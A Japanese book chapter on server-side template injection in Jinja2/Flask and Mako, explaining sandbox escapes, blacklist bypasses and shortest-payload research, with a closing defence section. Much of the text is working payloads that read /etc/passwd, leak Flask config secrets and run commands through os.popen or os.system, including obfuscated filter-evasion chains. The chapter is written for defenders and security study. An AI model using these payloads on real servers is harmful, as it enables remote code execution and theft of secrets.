# 第8章 エンジン別SSTIエクスプロイトとサンドボックス脱出

## Jinja2/Flaskのサンドボックス脱出とフィルタ回避

Python の Web フレームワーク Flask が標準採用するテンプレートエンジン **Jinja2** は、SSTI（Server-Side Template Injection：サーバ側テンプレート差し込み）の題材として最もよく研究されている実装である。本節では「なぜテンプレート式の中から OS コマンド実行（RCE）まで到達できてしまうのか」を Python の言語仕様レベルで解き明かし、あわせて防御側が知っておくべきフィルタ回避（ブラックリスト回避）の手口を整理する。

本書のスコープに従い、記述はすべて**防御目的**である。実在サービスや本番環境への無許可検証、破壊的コマンド（データ破壊・逆シェル一発起動など）の手順書は示さない。以降のペイロードは、原理説明のために `id` や `ls` といった無害な確認コマンドを用い、影響の大きさは概念として述べる。

### 用語の整理 — sink と「サンドボックス脱出」

- **sink（シンク）**: ユーザ入力が最終的に実行・解釈される危険な代入先。SSTI では「テンプレートエンジンに文字列として渡され、式として評価される箇所」が sink になる。たとえば `render_template_string("Hello " + name)` の `name` はまさに sink である。
- **サンドボックス脱出（sandbox escape）**: Jinja2 は `SandboxedEnvironment` という制限モードを持ち、危険な属性アクセス（`__globals__` など）を遮断できる。だが多くの Flask アプリは**そもそもサンドボックスを使っていない**（`render_template_string` は非サンドボックス環境）。攻撃の本質は「テンプレートの限られた式構文だけを起点に、通常の Python 実行フローへ戻る道を見つけること」である。HackTricks はこれを *"find a way to escape from the sandbox and recover access the regular python execution flow"* と表現している。

### 検出 — Jinja2 かどうかを見分ける

SSTI かどうか、そしてエンジンが Jinja2 かを最小限の入力で判定する。

```text
{{7*7}}    → 49        （テンプレートとして評価された証拠）
{{7*'7'}}  → 7777777   （Jinja2/Python のセマンティクス。Twig なら 49 になる）
```

`{{7*7}}` が `49` に化ければ「式が評価されている＝SSTI」が確定する。ここで `{{7*'7'}}` を追加で送ると、**文字列 × 整数が文字列反復になる**という Python 特有の挙動（`'7'*7 == '7777777'`）が現れる。Twig（PHP）は同じ式を数値 `49` にするため、この 1 発でエンジンを Jinja2 側に絞り込める。R3d Buck3T の記事では、まず `${{<%[%'"}}%\` のような**多言語フズ文字列**を撃ち込み、どの記号がエラーを起こし・どれが解釈されるかを観察してエンジンを推定する手順が示されている。

> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
> 出典: R3d Buck3T (Nairuz Abulhul) — RCE with Server-Side Template Injection — https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e

### 常に到達できるグローバルオブジェクト

Jinja2 テンプレート内では、以下のオブジェクトが（サンドボックスの有無に関わらず）ほぼ常に参照できる。これらが脱出の「足がかり」になる。

- リテラル: `[]`（list）, `''`（str）, `()`（tuple）, `dict`
- Flask がテンプレートに注入する変数: `config`（アプリ設定）, `request`（HTTP リクエスト）, `session`, `g`（リクエストローカルなグローバル記憶域）
- Jinja2 標準のグローバル関数: `lipsum`, `cycler`, `joiner`, `namespace`, および Flask の `url_for`, `get_flashed_messages`

これらは「ただのデータ」に見えるが、Python では**すべてがオブジェクトであり、オブジェクトは自分のクラス・継承ツリー・所属モジュールの名前空間へ辿るリンクを内部に持っている**。この参照リンクこそが脱出経路になる。

### 核心① オブジェクトクラスチェーン（MRO と `__subclasses__`）

脱出の王道は、任意のオブジェクトから **`<class 'object'>`（Python 全クラスの共通の祖先）** に登り、そこから「現在ロードされている全クラスの一覧」を取得して、危険なクラス（ファイル操作・`subprocess` など）を選び出す、という流れである。

登るために使う属性・メソッドの意味を押さえておく。

- `__class__`: そのインスタンスのクラスを返す（例: `''.__class__` → `<class 'str'>`）。
- `__base__` / `__mro__` / `mro()`: クラスの継承関係。`__mro__`（Method Resolution Order：メソッド解決順序）は、そのクラスがメソッドを探索する親クラスの並び。`object` は必ず末尾（`[-1]`）に来る。
- `__subclasses__()`: `object` に対して呼ぶと、**そのインタプリタに現在ロードされている object の直接サブクラス一覧**（数百〜千個）を返す。

```text
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
```

**なぜ動くのか**: どのリテラル（`dict`, `()`, `[]`）から出発しても、`__base__`（1 段上）または `__mro__[-1]`／`mro()[-1]`（一気に最上位）で必ず `object` に到達する。`object` は全クラスの親なので、`__subclasses__()` はインタプリタが読み込んだクラスをほぼ網羅列挙する。ここに `subprocess.Popen` や各種ファイル系クラスが混じっているため、あとは**目的のクラスを配列インデックスで拾う**だけでよい。

配列のインデックスは Python バージョン・ロード済みモジュール・アプリ構成で変動する点に注意（同じ CTF 環境でも版が違えばズレる）。R3d Buck3T の事例では `{{ "".__class__.__mro__[1].__subclasses__() }}` が **784 個**のクラスを返し、その中の `subprocess.Popen` が**インデックス `[407]`**にあった。HackTricks は `subprocess.Popen` が概ね `[396]` 付近、ファイル系クラスが `[40]` 付近という「よくある値」を挙げるが、これらは**環境依存の目安**であって固定値ではない。

#### ファイル読み書き

`object` のサブクラス群からファイルクラス（旧 Python 2 の `file` 相当や、`io` 系）を選ぶと、任意ファイルの読み書きに使える。

```text
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

`__mro__[1]` は str の直近の親（≒ object）で、そこから列挙したサブクラスのうちファイルを開けるものを 1 つ選び、`/etc/passwd` を開いて `.read()` している。これはローカルファイル読み取り（機密設定・鍵・ソース漏えい）に直結する。

#### インデックスに依存しない RCE（`warning` ループ）

環境ごとにズレるインデックスをハードコードするのを避けるため、**クラス名で探す**手法がよく使われる。

```text
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen("id").read() }}
  {% endif %}
{% endfor %}
```

**なぜ `warning` を狙うのか**: `warnings.catch_warnings` クラスは、そのインスタンスの `_module` 経由で `warnings` モジュールの `__builtins__`（組み込み名前空間）に辿れる。`__builtins__` には `__import__` があり、これで `os` を読み込み、`os.popen('id').read()` でコマンド実行できる。インデックス番号ではなくクラス名 `"warning"` で選ぶため、**版差に強い**のが利点である。上のループは列挙 → 名前一致 → 到達をワンショットで書いたテンプレート文である。

> 出典: HackTricks — Jinja2 SSTI（GitHub 原本ミラーより取得）— https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

⚠️ **未取得の資料**: 「HackTricks: Jinja2 SSTI」の正規ページ（hacktricks.wiki）は自動取得できませんでした（理由: 302 リダイレクト先の tollbit プロキシが `402 Payment Required` を返したため）。上記は**同一内容の GitHub 原本（HackTricks-wiki/hacktricks）の raw を取得**したもので実質内容は網羅できています。原文は次からご覧ください: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html

### 核心② `__globals__` 経由の脱出（object を経由しない道）

`__subclasses__()` を使わず、**関数オブジェクトが持つ `__globals__`**（その関数が定義されたモジュールのグローバル名前空間）から一気に組み込みへ抜ける道もある。こちらの方が短く安定することが多い。

```text
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() }}
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("id").read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**なぜ動くのか**: Python の関数は、自分が定義されたモジュールの**モジュールグローバル辞書**への参照を `__globals__` に持つ。`config` クラスのメソッド `from_envvar` は Flask 内部モジュールで定義されているため、その `__globals__` には Flask がインポート済みの `os` や、`__builtins__`（`__import__`・`open` を含む組み込み名前空間）が入っている。つまり「テンプレートから参照できる何らかの関数」を 1 つ見つけて `.__globals__.__builtins__` に触れれば、`__import__('os')` で自由にモジュールを引き込める。`get_flashed_messages` は Flask がデフォルトでテンプレートに公開するため、`config`/`request` が潰されていても足がかりになりやすい。

Jinja2 標準グローバルの `lipsum`・`cycler`・`joiner` も同じ原理で使える。

```text
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% print(cycler.__init__.__globals__['os'].popen('id').read()) %}
```

`lipsum`（ダミーテキスト生成関数）の `__globals__` には Jinja2 内部で import 済みの `os` がそのまま入っているため、`lipsum.__globals__['os']` が即 `os` モジュールになる。これは `config`/`request` を一切使わない経路として重要である。

### 核心③ フィルタ／ブラックリスト回避

多くの「なんちゃって対策」は、危険な文字や語（`.`、`_`、`[`、`]`、`__class__`、`config` など）を単純にブラックリストで弾く。しかし Jinja2 には**同じ意味を別の書き方で表現する手段**が豊富にあり、ブラックリストは容易に破られる。ここが本節で最も防御に効く部分である。

#### `.`（ドット）と `[]`（角括弧）を使わない — `attr` フィルタ

`request[...]` や `request....` の代わりに、Jinja2 標準の **`attr` フィルタ**で属性名を文字列として渡す。

```text
{{ request|attr("__class__") }}
```

`attr` は「文字列で指定した属性を取り出す」正規フィルタなので、`.` も `[]` も一切使わずに `__class__` へアクセスできる。ドット/角括弧のブラックリストはこれで無力化される。

#### `_`（アンダースコア）を使わない — hex エスケープと動的合成

`__class__` の `_` を書けない場合、**文字列内 hex エスケープ**や**文字結合**で `_` を実行時に作る。

```text
request|attr("\x5f\x5fclass\x5f\x5f")
request|attr(["_"*2, "class", "_"*2]|join)
```

**なぜ動くのか**: `\x5f` は文字 `_` の 16 進表記であり、**デコードは Jinja2/Python がテンプレート評価時に行う**。ブラックリストがリクエスト文字列を検査する段階ではソースに `_` が現れないため、素通りしてしまう。`["_"*2,"class","_"*2]|join` は「`_`×2 + `class` + `_`×2」を `|join` で連結し `__class__` を組み立てる方法だが、`_` そのものすら書きたくない／`|join` も禁止という段階では次の「外部入力からの持ち込み」に進む。

#### 禁止文字を外部入力から持ち込む — `request.args`/`headers`/`cookies`

ペイロード本体に禁止文字を書かず、**別のパラメータやヘッダに逃がして** `request` 経由で読み込む。

```text
?exploit={{ request|attr(request.args.param) }}&param=__class__
?exploit={{ request[request.args.param] }}&param=__class__
```

`request.args.param` は URL クエリの `param` の値（=`__class__`）を返すだけなので、テンプレート本文には危険語が現れない。フィルタが `exploit` パラメータしか検査していなければ、`param`・`request.cookies`・`request.headers`・`request.environ`・`request.values` などが**検査対象外の搬入口**になる。

#### `|join` すら禁止のとき — `|format`

`|join` を潰された場合は `|format` フィルタで `%s` 差し込みにより文字列を合成する。

```text
?c={{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}&f=%s%sclass%s%s&a=_
```

`f=%s%sclass%s%s` に `a=_` を 4 回差し込むと `__class__` が生成される。`join` を使わずに同じ結果を得るための代替手段である。

#### 文字列連結演算子 `~`

Jinja2 の `~` は文字列連結演算子で、`"__"~"class"~"__"` のように断片を繋げられる。`+` が数値加算に化ける文脈でも `~` は常に文字列連結になるため、語の再構成に使われる。

#### `{{ }}` そのものが禁止のとき — 文（statement）タグ

出力式 `{{ }}` を弾かれても、`{% ... %}` の**文タグ**で計算・出力ができる。

```text
{% set x = 7*7 %}{{ x }}
{% print(''.__class__.__mro__[1]) %}
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}YES{% endif %}
{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
```

`{% if ... %}` を使えば、出力を一切返さない状況でも「コマンド結果に `uid=` が含まれるか」を分岐で観測する**ブラインド（真偽ベース）**の抽出ができる。`{% print(...) %}` は式の値を直接書き出す拡張的手段である。

以下は「`.`・`_`・`[]`・`|join` をすべて禁止した環境」を想定して OnSecurity・HackTricks が示す、回避を組み合わせた完全ペイロードの形（コマンドは無害な `id`）。

```text
{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")
   |attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")
   |attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")
   |attr("popen")("id")|attr("read")() %}{% print(a) %}{% endwith %}
```

`.`/`[]` は全て `|attr(...)` に、`_` は全て `\x5f` に、辞書アクセス `[...]` は `__getitem__` の呼び出しに置換されている。これ 1 つで「単純なブラックリストは設計として破綻している」ことが分かる。

> 出典: OnSecurity — Server Side Template Injection with Jinja2 — https://onsecurity.io/article/server-side-template-injection-with-jinja2/
> 出典: HackTricks — Jinja2 SSTI（GitHub 原本ミラー）— https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md

⚠️ **未取得の資料**: 「OnSecurity: Server Side Template Injection with Jinja2」の本文は自動取得できませんでした（理由: `403 Forbidden`）。上記のフィルタ回避（`attr`／`request.args` による `_` 持ち込み／`\x5f` hex エスケープ／`|join`・`|format`）は **WebSearch 経由で得た同記事の要約と、内容が一致する HackTricks 原本**から再構成しています。原文は次からご覧ください: https://onsecurity.io/article/server-side-template-injection-with-jinja2/
> （以下は未取得資料の補足として一般知識に基づく解説です）OnSecurity の記事は、PayloadsAllTheThings を下敷きに「ドット・アンダースコア・角括弧・`join` を段階的に禁止していったとき、それぞれをどの Jinja2 機能で置き換えるか」を実例で追う構成になっている。要点は本節で網羅した「`attr` フィルタ」「外部入力からの禁止文字搬入」「hex エスケープ」の 3 本柱である。

### `config` オブジェクトの悪用と情報漏えい

`config` は Flask アプリの設定辞書で、**それ自体が高価値の情報源**である。

```text
{{ config }}
{{ config.items() }}
{% for k, v in config.items() %}{{ k|e }}: {{ v|e }}{% endfor %}
```

`config.items()` は `SECRET_KEY`・DB 接続情報・環境変数など、グローバル設定を丸ごと露出させる。`SECRET_KEY` が漏れれば Flask セッション Cookie の偽造（署名の付け直し）に直結する。

さらに `config` はメソッド経由で危険な操作にも使える。R3d Buck3T の記事では、`{{ config.from_object('os') }}` で config に `os` モジュールを取り込ませてから、`config.items()` 由来のクラス参照 → `__mro__` → `__subclasses__()[index]` の順に `subprocess.Popen` へ到達している。HackTricks は `config` が潰されても、`request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config[...]` のように**別経路で `current_app.config` に回り込める**ことを示す。要は「1 つの入口を塞いでも、Python オブジェクトグラフには無数の迂回路がある」ということである。

> 出典: R3d Buck3T (Nairuz Abulhul) — RCE with Server-Side Template Injection — https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
> 出典: pequalsnp-team — Cheatsheet: Flask & Jinja2 SSTI — https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

⚠️ **未取得の資料**: 「R3d Buck3T: RCE with Server-Side Template Injection」の Medium 本文は正規 URL では自動取得できませんでした（理由: `403 Forbidden`）。上記の検出手順（`${{<%[%'"}}%\` によるフズ、`{{7*7}}`）・`get_flashed_messages.__globals__` によるファイル読み・`config.from_object('os')`・`subclasses()[407]` での `subprocess.Popen` 到達は、**Google 翻訳ミラー（medium-com.translate.goog）経由で取得した同記事の内容**に基づきます。原文は次からご覧ください: https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e

### RCE に至る全体像（まとめ）

SSTI → RCE の到達経路を俯瞰すると、次の 3 パターンに集約される。

1. **object サブクラス経由**: 任意リテラル → `__mro__[-1]`（object）→ `__subclasses__()` → `subprocess.Popen`／ファイルクラスをインデックスまたはクラス名で選択。
2. **`__globals__` 経由**: 任意の関数（`config` のメソッド、`get_flashed_messages`、`lipsum` など）→ `.__globals__.__builtins__.__import__('os')` → `os.popen(...)`。
3. **`config` 経由**: 設定の情報漏えいそのもの、または `from_object`/`from_pyfile` を絡めたモジュール読み込み。

いずれも「テンプレート式という狭い入口」から「Python の完全な実行環境」へ復帰しているだけで、Jinja2 のバグではなく**設計どおりのオブジェクト到達性**を利用している点に注意したい。破壊的な逆シェル（`mkfifo`+`nc` 型など）も原理は同じ `subprocess.Popen` 呼び出しの延長にすぎず、影響は「サーバ上での任意コマンド実行＝完全侵害」と理解すればよい。本書では実行可能な逆シェル手順は示さない。

### 防御 — サンドボックスに頼らない設計

フィルタ回避の豊富さが示すとおり、**入力ブラックリストは根本対策にならない**。防御は次の順で考える。

1. **ユーザ入力をテンプレート「ソース」に連結しない**。`render_template_string(user_input)` や `"..."+user_input` を避け、必ず**変数として**渡す（`render_template("page.html", name=user_input)`）。データとコードを分離すれば SSTI は起きない。
2. **どうしても動的テンプレートが要るなら `SandboxedEnvironment`**（できれば `ImmutableSandboxedEnvironment`）を使い、`__globals__`・`__subclasses__` 等へのアクセスを遮断する。ただしサンドボックスにも過去に脱出 CVE（例: `str.format` 悪用系）があり、**サンドボックス＝安全ではない**。多層防御の 1 枚と位置づける。
3. **最小権限化とセグメンテーション**: アプリ実行ユーザの権限縮小、`SECRET_KEY` 等の秘匿情報を環境から分離し、`config` 露出時の被害を限定する。
4. **検知**: `{{`・`__class__`・`__globals__`・`mro`・`subclasses` などのパターンや、テンプレート評価時の異常を WAF/ログで監視する（回避される前提で、あくまで検知の一助として）。

要するに、Jinja2 SSTI 対策の本丸は「**入力をテンプレート言語として解釈させない**」という一点にある。フィルタ強化は攻撃者との軍拡競争になり、本節で見たとおり最終的に破られる。

## Jinja2ペイロード最適化とMako/Tornado

前節までで、SSTI（Server-Side Template Injection：ユーザー入力がテンプレートの「コード」として評価されてしまう欠陥）が最終的にRCE（Remote Code Execution：リモートからの任意コード実行）へ至る一般原理を見た。本節では、Pythonの3大テンプレートエンジン **Jinja2 / Mako / Tornado** に絞り込み、次の2点を仕組みレベルで掘り下げる。

1. **Jinja2のペイロード最適化** — なぜ「最短ペイロード」を探すことに意味があり、どういう原理（Pythonオブジェクトのグラフ探索）で導けるのか。
2. **Mako / Tornado** — Jinja2とは内部構造が異なるため、到達経路（sink：入力が最終的に実行・解釈される危険な代入先）も別物になる。それぞれの固有チェーンを押さえる。

本節はすべて **防御目的**（検知シグネチャ設計、WAFルール検証、サンドボックス設計の評価）で記述する。実在サービスや本番環境への無許可検証、破壊的手順は扱わない。ペイロードは「攻撃者が何を書いてくるか」を守り手が理解するための参照として示す。

---

### なぜ「最短ペイロード」を最適化するのか

古典的なJinja2 RCEペイロードは、次のような **添字（index）依存** の形をとっていた。

```jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
```

- `''.__class__` は空文字列 `str` のクラス（`str`）。
- `.__mro__`（Method Resolution Order：メソッド解決順序）は継承の親をたどる配列で、`[2]`（あるいは `.mro()[1]`）で最上位の `object` に到達する。
- `object.__subclasses__()` は「その時点でロードされている全サブクラスのリスト」を返す。ここに `subprocess.Popen` や `<class 'os._wrap_close'>`、ファイルを開くクラスなどが紛れ込んでいる。
- 攻撃者は目的クラスのインデックス（例では `[396]` や `[40]`）を指定して呼び出す。

**この方式の致命的な弱点**は、`__subclasses__()` の順序と長さが**環境依存**だという点にある。読み込まれているモジュール、Pythonのマイナーバージョン、インポート順が違えば `[396]` の中身は別のクラスにずれる。これはセキュリティ研究者 Rémi Gascou（Podalirius）が「**egg hunter（卵探し）方式**」と呼んで批判した性質で、CTFの1環境では動くが、汎用的な攻撃コード・検知シグネチャの土台としては脆い。

そこで登場するのが **コンテキストフリー（context-free）で、かつ最短のペイロード** を体系的に導く発想である。これがGreHack 2021の研究テーマだった。守り手にとっての意味は明確で、「攻撃者が添字に依存しない普遍的な短いペイロードを持っている」前提でシグネチャや入力検証を組む必要がある、ということだ。

> ⚠️ **未取得の資料**: 「GreHack 2021 - Optimizing Server Side Template Injection payloads for Jinja2（ResearchGate版）」は自動取得できませんでした（理由: ResearchGateがHTTP 403 Forbiddenを返しアクセス拒否）。以下のURLからご自身で直接ご覧ください: https://www.researchgate.net/publication/378299322_GreHack_2021_-_Optimizing_Server_Side_Template_Injection_payloads_for_Jinja2
>
> なお、同一著者（Podalirius）が自身の公開ページで同じ論文・スライド・解説記事を配布しており、本節の技術内容はそちらの原典（下記URL）から取得して記述している: https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/

#### グラフ探索としてのペイロード最適化（GreHack 2021の中核アイデア）

研究の核心は、**「Pythonオブジェクトの世界を有向グラフとしてモデル化し、到達可能な入口ノードから高価値ターゲット（`os` モジュールや組み込み関数）への最短経路を探索する」** という考え方である。

- **ノード**＝Pythonオブジェクト（`cycler`、`str`、`os` モジュール、各関数など）。
- **エッジ**＝属性アクセス（`.attr`）や添字アクセス。あるオブジェクトから別のオブジェクトへ「一歩」で到達できる関係。
- **入口ノード**＝Jinja2テンプレート内でデフォルトで参照できるグローバル変数。
- **ゴールノード**＝`os` モジュールや `__builtins__.__import__` など、コマンド実行に使える高価値オブジェクト。

探索アルゴリズムは **幅優先探索（BFS：Breadth-First Search）** を用いる。BFSはグラフを「近いノードから順に」波紋状に探るため、**最初にゴールへ到達した経路が自動的に最短経路になる**という性質を持つ。これがまさに「最短ペイロード」を得たい目的に合致する。

ただしPythonオブジェクトのグラフには **循環参照** が大量にある（`a.__class__.__class__...` は無限にたどれる）。無限ループを避けるため、アルゴリズムは **訪問済みオブジェクトの `id()`（メモリ上の一意な識別子）をリストに記録** し、同じオブジェクトを二度と展開しない。原典の表現を借りれば「探索した各オブジェクトの `id` を格納するリストを作る」ことで、有向グラフの探索を有限化している。再帰関数が設定した最大深さまで属性を掘り下げ、その途中でモジュールや組み込み関数といった高価値ターゲットへの経路を収集する。

> 出典: GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2 — https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/

#### 導かれた最短ペイロードと、その原理

この探索が見つけ出した、添字に依存しない **コンテキストフリー最短経路** が次の3本である。

```jinja2
{{ cycler.__init__.__globals__.os }}
{{ joiner.__init__.__globals__.os }}
{{ namespace.__init__.__globals__.os }}
```

いずれも `os` モジュールそのものに到達するまで**約45文字**で、従来の `''.__class__.mro()[1].__subclasses__()[396]...` 型（100文字超）と比べて大幅に短い。

**なぜこれで `os` に届くのか** を仕組みで説明する。

- `cycler` / `joiner` / `namespace` は、Jinja2が**デフォルトでテンプレートに注入するグローバル変数**（ユーティリティ）である。攻撃者が何も準備しなくても常に存在する、信頼できる「入口ノード」だ。
- これらは `jinja2.utils` モジュール内で定義されたクラスの実体。`cycler.__init__` はそのクラスの初期化メソッド（関数オブジェクト）。
- あらゆるPython関数は `__globals__` という属性を持ち、これは **「その関数が定義されたモジュールのグローバル名前空間（辞書）」** を指す。
- `cycler` は `jinja2.utils` で定義されているため、`cycler.__init__.__globals__` は `jinja2.utils` のグローバル辞書になる。そして `jinja2.utils` は内部で `import os` している。したがって `__globals__` 辞書に `os` キーが存在し、`.os` で直接 `os` モジュールへ到達できる。

ここまで来れば、実際のコマンド実行は `os` の関数を呼ぶだけである（原典・PayloadsAllTheThingsの実物）。

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

- `lipsum`（ロレム・イプサム生成関数）は少し特殊で、**関数そのもの**なので `.__init__` を挟まず `lipsum.__globals__` で直接そのモジュールのグローバル辞書に届く。ここでも `os` がインポートされているため `lipsum.__globals__["os"]` で `os` を取れる。この点で `lipsum` はさらに短く、実戦で最も多用される入口の一つ。
- `os.popen('id').read()` は `id` コマンドを実行し標準出力を読み取る。防御観点では、これら4つのグローバル名（`cycler` `joiner` `namespace` `lipsum`）と `__globals__` の組み合わせは**Jinja2 SSTIの決定的シグネチャ**になる。

> ⚠️ 環境依存の注意: `os` が `__globals__` 直下に存在するかは、その入口モジュールが実際に `import os` しているかに依存する。Jinja2のバージョンや内部実装で `jinja2.utils` のインポート内容が変われば、`.os` が消える可能性がある。その場合の汎用フォールバックが、`os` を経由せず組み込み関数から `__import__` する経路である。

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

- `__builtins__` は常に存在する組み込み名前空間で、その中の `__import__` は `import 文` の内部実装関数。`__import__('os')` は動的に `os` をインポートして返すため、**入口モジュールが `os` を import していなくても**到達できる。より確実だが、その分ペイロードは長くなる。「短さ（検知回避）」と「確実さ（環境非依存）」はトレードオフになる、という点が最適化研究の実務的な含意である。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

---

### Jinja2のフィルタ／WAFバイパスとサンドボックス脱出

守り手がブラックリスト（`_`、`.`、`class`、`os` などの語をフィルタ）で防ごうとしても、Jinja2の言語機能そのものが回避手段を与えてしまう。攻撃者がどう「禁止文字を書かずに同じ属性へ到達するか」を理解しておく必要がある。

#### アンダースコア `_` のフィルタ回避

`__class__` のような **ダンダー（double underscore）属性** をフィルタしたい場合、`_` そのものを禁止しがちだが、`attr` フィルタと文字列連結で組み立てられてしまう。

```jinja2
{{ request|attr(["__","class","__"]|join) }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
```

- `attr(name)` フィルタは「文字列 `name` で表される属性」を動的に取得する。`getattr(obj, name)` 相当。
- `"_"*2` は Jinja2内の文字列演算で `"__"` を生成する。`|join` でリストを連結し `"__class__"` を組み上げる。**ペイロードの表面には `__class__` という連続文字列が現れない**ため、単純な部分文字列マッチのWAFを抜ける。

さらに、禁止語をリクエストパラメータ側に外出しして、テンプレート本文からは変数参照だけにする手口もある（原典の実物）。

```
/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
```

- `request.args.usc` は `?usc=_` の値 `_`、`request.args.class` は `?class=class`。テンプレート本文には `_` も `class` という文字列も直接は書かれず、すべてクエリ経由で注入される。

#### 角括弧 `[` `]` の回避（format）

添字/リテラルリストの `[` を禁止された場合、`format` フィルタでC言語風の書式文字列を使う。

```
/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

- `f=%s%sclass%s%s`、`a=_` を与えると、`format` が `%s` を順に `_` で置換して `__class__` を生成する。`[` `]` も `join` も使わずに属性名を作る。

#### 16進エンコードによる属性アクセス

属性名の各文字を `\xNN` に置換して、キーワードマッチを回避する。

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

- `\x5f` は `_` のASCIIコード。`\x5f\x5fglobals\x5f\x5f` は評価時に `__globals__` になる。文字列リテラル内のエスケープはPython側で展開されるため、**WAFが素の `__globals__` を検索しても一致しない**。`attr(...)` を鎖状に連ねて `request.application → __globals__ → __builtins__ → __import__('os') → popen('id') → read()` と正攻法の経路をたどる。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Python — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

#### サンドボックス（SandboxedEnvironment）と脱出の原理

Jinja2には防御機構として `SandboxedEnvironment` が用意されている。これは通常の `Environment` を差し替えるもので、内部では属性アクセス（`getattr`）や添字アクセスを **`is_safe_attribute()` / `is_safe_callable()`** というフックで検査する。既定では、

- `_` で始まる属性（`__class__`、`__globals__`、`__init__` など内部属性）へのアクセスを**拒否**する。
- 安全でないと判断された呼び出しを `SecurityError` で弾く。

したがって、前述の `cycler.__init__.__globals__...` 型は**サンドボックス下では原則ブロックされる**。これが「最短ペイロードはサンドボックスなしのナイーブな `render_template_string` 実装を前提にしている」と守り手が理解すべき理由である。

一方で、サンドボックスの脱出は歴史的に何度も見つかっている。原理は「**内部属性を直接触らずに、公開された安全な属性の連鎖の先に危険な参照が漏れている**」経路を探すこと。たとえば `str.format` の書式指定経由で属性へ到達する古典的手法（`{0.__class__}` 相当の書式）や、文字列フォーマットのフィールドアクセスがサンドボックスのチェックを迂回するケースが知られてきた。防御の結論は明確で、**サンドボックスは「多層防御の一枚」であって信頼境界そのものにはできない**。ユーザー入力を**テンプレートのソースとして**渡す設計（`render_template_string(user_input)` など）を根絶することが唯一の確実な対策である。

---

### Mako テンプレートのRCE経路

Mako（Pyramid/Pylons系や多くのPythonアプリで使われる）はJinja2と**言語仕様も内部構造も別物**なので、到達経路も異なる。

- **展開構文は `${ ... }`**（Jinja2の `{{ }}` ではない）。検知シグネチャを書くときはこの差を必ず区別する。
- Makoは制御構文としてPythonをかなり直接的に埋め込める設計で、そもそもサンドボックスを主目的にしていない。次のように**素のPython文**を書ける場合すらある。

```mako
<%import os%>
${os.popen('id').read()}
```

- `<% ... %>` はPythonコードブロック、`${ ... }` は式の展開。`import os` して `os.popen` を呼ぶだけで、Jinja2のようなオブジェクトグラフ探索は不要。Makoでは「テンプレート＝ほぼPython」なので、注入できた時点でRCE難度は極めて低い。

`import` すら書けない制約下でも、Makoは内部モジュールを通じて `os` に到達する固有チェーンが多数存在する（原典では48種のバリエーションが挙げられている）。

```mako
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.__init__.__globals__['os'].system('id')}
```

